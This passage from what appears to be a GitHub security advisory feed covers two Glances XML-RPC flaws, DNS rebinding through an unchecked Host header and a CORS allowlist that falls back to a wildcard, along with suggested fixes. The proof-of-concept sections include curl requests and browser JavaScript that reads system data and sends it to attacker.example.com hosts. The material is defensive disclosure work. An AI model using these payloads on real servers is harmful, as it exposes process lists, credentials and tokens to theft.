</tr>
</thead>
<tbody><tr>
<td>XML-RPC</td>
<td><code>attacker.example.com</code></td>
<td>200 OK</td>
<td>Yes — VULNERABLE</td>
</tr>
<tr>
<td>XML-RPC</td>
<td><code>127.0.0.1:61209</code></td>
<td>200 OK</td>
<td>Yes (baseline)</td>
</tr>
<tr>
<td>REST API</td>
<td><code>attacker.example.com</code></td>
<td>400 Bad Request</td>
<td>No — patched</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Attack overview</strong></p>
<p>DNS rebinding breaks the browser Same-Origin Policy by making <code>attacker.example.com</code> temporarily resolve to the target's IP address (e.g. <code>127.0.0.1</code>).  From that point the victim's browser treats the attacker's page as same-origin with <code>http://attacker.example.com:61209/RPC2</code>, forwarding the attacker-controlled <code>Host</code> header to the local Glances XML-RPC server, which accepts it without validation.</p>
<p><strong>Special configuration required</strong></p>
<p>No special <code>glances.conf</code> settings are needed.  The vulnerability is present in a default Glances XML-RPC server start (<code>glances -s</code>).  For the comparison test (Step 3) the REST server must also be started; that step requires Glances to be installed with web dependencies (<code>pip install "glances[web]"</code>).</p>
<hr>
<p><strong>Step 1 — Start the Glances XML-RPC server</strong></p>
<pre><code class="language-bash">glances -s -p 61209
</code></pre>
<p><strong>Step 2 — Confirm the server accepts an arbitrary Host header</strong></p>
<pre><code class="language-bash">curl -s -D - -X POST "http://127.0.0.1:61209/RPC2" \
     -H "Host: attacker.example.com" \
     -H "Content-Type: text/plain" \
     -d '&lt;?xml version="1.0"?&gt;
         &lt;methodCall&gt;&lt;methodName&gt;getAllPlugins&lt;/methodName&gt;&lt;/methodCall&gt;'
</code></pre>
<p>Expected result (secure): <code>HTTP/1.0 400 Bad Request</code>
Actual result: <code>HTTP/1.0 200 OK</code> with full XML-RPC response body.</p>
<p><strong>Step 3 — Confirm the REST API is patched (comparison)</strong></p>
<pre><code class="language-bash"># Start REST server with the same machine as allowed host:
glances -w -p 61210 --webui-port 61210

curl -s -o /dev/null -w "%{http_code}\n" \
     "http://127.0.0.1:61210/api/4/status" \
     -H "Host: attacker.example.com"
# Returns: 400   (TrustedHostMiddleware rejects the spoofed Host)
</code></pre>
<p><strong>Step 4 — Full DNS rebinding exploitation (real-world path)</strong></p>
<ol>
<li>Attacker registers <code>attacker.example.com</code> with a low-TTL (1 second) DNS record initially pointing to their own server IP.</li>
<li>Attacker serves the following page from <code>http://attacker.example.com</code>:</li>
</ol>
<pre><code class="language-html">&lt;script&gt;
async function exfil() {
  const payload = `&lt;?xml version="1.0"?&gt;
    &lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;`;
  try {
    const r = await fetch('http://attacker.example.com:61209/RPC2', {
      method:  'POST',
      headers: { 'Content-Type': 'text/plain' },
      body:    payload,
    });
    const data = await r.text();
    // data contains: hostname, OS, all processes with cmd-lines, network, disk
    await fetch('https://collect.attacker.example.com/?d=' + btoa(data));
  } catch (_) {}
}

// Wait for TTL to expire and DNS to rebind to 127.0.0.1, then call exfil()
setTimeout(exfil, 5000);
&lt;/script&gt;
</code></pre>
<ol start="3">
<li>Victim visits <code>http://attacker.example.com</code> in their browser.</li>
<li>After TTL expiry, the attacker's DNS server responds with <code>127.0.0.1</code>.</li>
<li>The browser's <code>fetch()</code> call is sent to <code>127.0.0.1:61209</code> with <code>Host: attacker.example.com</code>; the XML-RPC server accepts it.</li>
<li>The <code>Access-Control-Allow-Origin: *</code> header (see companion advisory) allows the browser to read the response body.</li>
<li>The attacker receives the complete system monitoring snapshot.</li>
</ol>
<p>Tools that simplify DNS rebinding for research/testing include:</p>
<ul>
<li><a href="https://github.com/nccgroup/singularity">Singularity</a></li>
<li><a href="https://rbndr.us">rbndr.us</a></li>
</ul>
<p><strong>Step 5 — Confirm absence of Host check in source</strong></p>
<pre><code class="language-python">import sys, inspect
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
import glances.server as s

src = inspect.getsource(s.GlancesXMLRPCHandler)
print('Host check present:', 'allowed_hosts' in src or 'Host' in src)
# Host check present: False
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> Insufficient Verification of Data Authenticity / DNS Rebinding (CWE-350)</p>
<p><strong>Who is impacted:</strong> Any user whose browser can reach a Glances XML-RPC server and who can be lured to visit an attacker controlled web page.  This includes deployments where:</p>
<ul>
<li>Glances is bound to <code>127.0.0.1</code> (loopback) — DNS rebinding bypasses the loopback restriction.</li>
<li>Glances is bound to a LAN IP — any browser on that LAN is at risk.</li>
<li>Glances is exposed on a public IP — any browser on the internet is at risk.</li>
</ul>
<p><strong>Data exposed through the XML-RPC API</strong> includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, database passwords, and access tokens passed as environment variables or CLI flags), CPU/memory/disk/network statistics, open file descriptors, listening ports, and Docker/Kubernetes container metadata.</p>
<p><strong>Impact:</strong></p>
<ul>
<li><strong>Confidentiality:</strong> High — complete system monitoring data readable remotely without credentials.</li>
<li><strong>Integrity:</strong> None — read-only XML-RPC API.</li>
<li><strong>Availability:</strong> None — no denial-of-service component.</li>
</ul>
<p>The attack is amplified by the companion CORS wildcard issue (vuln03): without <code>Access-Control-Allow-Origin: *</code>, the browser would still block the response read.  Both issues must be fixed together for effective remediation.</p>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<p><strong>Option 1 — Add Host validation to the XML-RPC handler (preferred)</strong></p>
<p>Add a <code>webui_allowed_hosts</code> (or new <code>xmlrpc_allowed_hosts</code>) configuration key, and validate the <code>Host</code> header in <code>GlancesXMLRPCHandler</code>:</p>
<pre><code class="language-python"># server.py
class GlancesXMLRPCHandler(SimpleXMLRPCRequestHandler, GlancesAPI):

    allowed_hosts: list[str] = []   # populated from config

    def parse_request(self) -&gt; bool:
        if not super().parse_request():
            return False
        if self.allowed_hosts:
            host = self.headers.get('Host', '').split(':')[0]
            if host not in self.allowed_hosts:
                self.send_error(400, 'Bad Request: invalid Host header')
                return False
        return True
</code></pre>
<p>Populate <code>allowed_hosts</code> from the existing <code>webui_allowed_hosts</code> config key (already used by the REST server), so operators have a single knob.</p>
<p><strong>Option 2 — Deprecate and remove the XML-RPC server</strong></p>
<p>The XML-RPC server is a legacy interface.  The REST API (<code>glances -w</code>) provides a superset of functionality, is actively maintained, and has all current security controls.  Deprecating the XML-RPC server in the next major release and directing users to the REST API would eliminate this attack surface entirely.</p>
<hr>
<h3 id="responsible-disclosure">Responsible Disclosure</h3>
<h2 id="the-afine-team-is-committed-to-responsible--coordinated-disclosure--the-afine-team-will-not-publish-details-of-this-vulnerability-or-release-exploit-code-publicly-until-a-fix-has-been-released-or-90-days-have-elapsed-from-the-date-of-this-report-whichever-comes-first">The AFINE Team is committed to responsible / coordinated disclosure.  The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first. </h2>
<h3 id="credits">Credits</h3>
<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-w856-8p3r-p338">https://github.com/nicolargo/glances/security/advisories/GHSA-w856-8p3r-p338</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-w856-8p3r-p338">https://github.com/advisories/GHSA-w856-8p3r-p338</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w856-8p3r-p338</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T21:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glances] Glances: XML-RPC Multi-Origin CORS Configuration Silently Falls Back to Wildcard (Incomplete Fix for CVE-2026-33533)]]></title>
        <id>https://github.com/advisories/GHSA-87qc-fj39-wccr</id>
        <link href="https://github.com/advisories/GHSA-87qc-fj39-wccr"/>
        <updated>2026-06-22T21:27:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Glances XML-RPC server (<code>glances -s</code>) introduced a configurable CORS origin list in version 4.5.3 as a mitigation for CVE 2026-33533.  However, the implementation silently falls back to <code>Access-Control-Allow-Origin: *</code> whenever <code>cors_origins</code> contains more than one entry.  An operator who configures an explicit two-entry allowlist (e.g. two internal dashboard origins) intending to restrict browser access instead receives the unrestricted wildcard — the same exposure that the original CVE described.  A malicious web page served from any origin can issue a CORS simple request to <code>/RPC2</code> and read the full system monitoring dataset without the victim's knowledge.</p>
<hr>
<h3 id="details">Details</h3>
<p><strong>Affected file:</strong> <code>glances/server.py</code>, class <code>GlancesXMLRPCServer</code>, line 113</p>
<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
<ul>
<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/server.py#L113</a></li>
</ul>
<pre><code class="language-python"># server.py  (GlancesXMLRPCServer.__init__)
cors_origins = self.args.cors_origins   # list from config / CLI

# Line 113 — the incomplete fix:
self.cors_origin = cors_origins[0] if len(cors_origins) == 1 else '*'
#                                                                  ^^^
# Any allowlist with 2+ entries collapses to the wildcard
</code></pre>
<p>The <code>cors_origin</code> value is then echoed back as the <code>Access-Control-Allow-Origin</code> response header for every request (line ~147 in the same file):</p>
<pre><code class="language-python">self.send_header('Access-Control-Allow-Origin', self.cors_origin)
</code></pre>
<p>This means the CORS header is determined once at server startup and never compared against the actual <code>Origin</code> header sent by the browser.  Even if an operator sets:</p>
<pre><code class="language-ini"># glances.conf
[outputs]
cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
</code></pre>
<p>the server responds with <code>Access-Control-Allow-Origin: *</code> to every request, including those from <code>https://attacker.example.com</code>.</p>
<p><strong>Single-origin wildcard</strong> (the default, <code>cors_origins = *</code>) is also still in effect; the fix only helps if exactly one non-wildcard origin is configured.</p>
<p><strong>Confirmed on:</strong> x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).</p>
<p>Test results:</p>
<table>
<thead>
<tr>
<th>Origin sent</th>
<th>ACAO header returned</th>
<th>Expected</th>
</tr>
</thead>
<tbody><tr>
<td><code>http://evil.example.com</code></td>
<td><code>*</code></td>
<td>No header</td>
</tr>
<tr>
<td><code>https://dashboard.corp</code></td>
<td><code>*</code></td>
<td>Reflected</td>
</tr>
<tr>
<td><code>https://grafana.corp</code></td>
<td><code>*</code></td>
<td>Reflected</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Special configuration required</strong></p>
<p>The multi-origin collapse is only triggered when <code>cors_origins</code> contains two or more entries.  Create the following <code>glances.conf</code>:</p>
<pre><code class="language-ini"># /tmp/glances_multiorigin.conf
[global]
check_update = false

[outputs]
cors_origins = https://dashboard.corp.example.com,https://grafana.corp.example.com
</code></pre>
<p><strong>Step 1 — Start the XML-RPC server using the config above</strong></p>
<pre><code class="language-bash">glances -s -p 61209 -C /tmp/glances_multiorigin.conf
</code></pre>
<p><strong>Step 2 — Send a CORS simple request from a foreign origin</strong></p>
<pre><code class="language-bash">curl -s -D - -X POST "http://TARGET_HOST:61209/RPC2" \
     -H "Content-Type: text/plain" \
     -H "Origin: http://evil.example.com" \
     -d '&lt;?xml version="1.0"?&gt;
         &lt;methodCall&gt;&lt;methodName&gt;getAllPlugins&lt;/methodName&gt;&lt;/methodCall&gt;'
</code></pre>
<p><strong>Expected (secure) response:</strong></p>
<pre><code>HTTP/1.0 400 Bad Request
</code></pre>
<p>or no <code>Access-Control-Allow-Origin</code> header.</p>
<p><strong>Actual response:</strong></p>
<pre><code>HTTP/1.0 200 OK
Access-Control-Allow-Origin: *
...
&lt;?xml version='1.0'?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;
    &lt;value&gt;&lt;string&gt;cpu&lt;/string&gt;&lt;/value&gt;
    &lt;value&gt;&lt;string&gt;mem&lt;/string&gt;&lt;/value&gt;
    ...
  &lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;
&lt;/methodResponse&gt;
</code></pre>
<p><strong>Step 3 — Demonstrate the code-level collapse to wildcard</strong></p>
<pre><code class="language-python">import sys
sys.path.insert(0, '/path/to/glances')   # adjust to local clone
from glances.config import Config

c = Config('/tmp/glances_multiorigin.conf')
cors_list = c.get_list_value('outputs', 'cors_origins', default=['*'])
# Reproduces server.py line 113:
result = cors_list[0] if len(cors_list) == 1 else '*'

print('cors_origins config :', cors_list)
print('cors_origin applied :', result)
print('Is wildcard?        :', result == '*')
# cors_origins config : ['https://dashboard.corp.example.com', 'https://grafana.corp.example.com']
# cors_origin applied : *
# Is wildcard?        : True
</code></pre>
<p><strong>Browser-based exploitation</strong></p>
<p>Once the wildcard is confirmed, the original CVE-2026-33533 attack vector still applies in full.  A malicious page served to a victim whose browser can reach the Glances server can exfiltrate data as follows:</p>
<pre><code class="language-javascript">// Runs in a page on http://evil.example.com
const payload = `&lt;?xml version="1.0"?&gt;
  &lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;`;

fetch('http://GLANCES_HOST:61209/RPC2', {
  method: 'POST',
  headers: { 'Content-Type': 'text/plain' },
  body: payload,
})
.then(r =&gt; r.text())
.then(data =&gt; {
  // 'data' contains hostname, OS, full process list, network interfaces, etc.
  fetch('https://attacker.example.com/collect?d=' + btoa(data));
});
</code></pre>
<p>This works as a CORS "simple request" (POST + <code>text/plain</code>) — no CORS preflight is triggered and the <code>*</code> wildcard allows the browser to read the response.</p>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> CORS Misconfiguration / Bypass of CVE-2026-33533 mitigation (CWE-942)</p>
<p><strong>Who is impacted:</strong> Any operator who:</p>
<ol>
<li>Runs Glances in XML-RPC server mode (<code>glances -s</code>), <em>and</em></li>
<li>Has configured two or more <code>cors_origins</code> entries in <code>glances.conf</code> believing
they are restricting browser access.</li>
</ol>
<p>Operators using the default single-wildcard configuration (<code>cors_origins = *</code>, which is the upstream default) remain affected by the original CVE-2026-33533 exposure (unrestricted cross-origin read).  The incomplete fix addresses only the narrow case of a single non-wildcard origin.</p>
<p><strong>Data exposed through the XML-RPC API</strong> includes: hostname, OS and kernel version, full process list with command-line arguments (frequently containing API keys, passwords, and tokens), CPU/memory/disk/network statistics, listening ports, and Docker/Kubernetes container metadata.</p>
<p><strong>Impact:</strong></p>
<ul>
<li><strong>Confidentiality:</strong> High — complete system monitoring data readable by any browser page.</li>
<li><strong>Integrity:</strong> None — read-only API.</li>
<li><strong>Availability:</strong> None — no denial-of-service component.</li>
</ul>
<hr>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Implement per-request origin reflection against the configured allowlist, as recommended by the W3C CORS specification and as done by modern CORS middleware (e.g. Starlette's <code>CORSMiddleware</code>):</p>
<pre><code class="language-python"># server.py  — replace the single static self.cors_origin field with:

def _get_acao_header(self, request_origin: str) -&gt; str | None:
    """Return the correct Access-Control-Allow-Origin value or None."""
    if not self.cors_origins or '*' in self.cors_origins:
        return '*'
    if request_origin in self.cors_origins:
        return request_origin
    return None   # do not send the header for unlisted origins

# In do_POST / send_response:
origin = self.headers.get('Origin', '')
acao   = self._get_acao_header(origin)
if acao:
    self.send_header('Access-Control-Allow-Origin', acao)
    self.send_header('Vary', 'Origin')
</code></pre>
<p>Additionally, consider retiring the legacy XML-RPC server in favour of the REST API (<code>glances -w</code>), which uses Starlette's <code>CORSMiddleware</code> correctly, and document the deprecation path.</p>
<hr>
<h3 id="responsible-disclosure">Responsible Disclosure</h3>
<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
<hr>
<h3 id="credits">Credits</h3>
<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr">https://github.com/nicolargo/glances/security/advisories/GHSA-87qc-fj39-wccr</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-87qc-fj39-wccr">https://github.com/advisories/GHSA-87qc-fj39-wccr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87qc-fj39-wccr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T21:27:24.000Z</published>
    </entry>
</feed>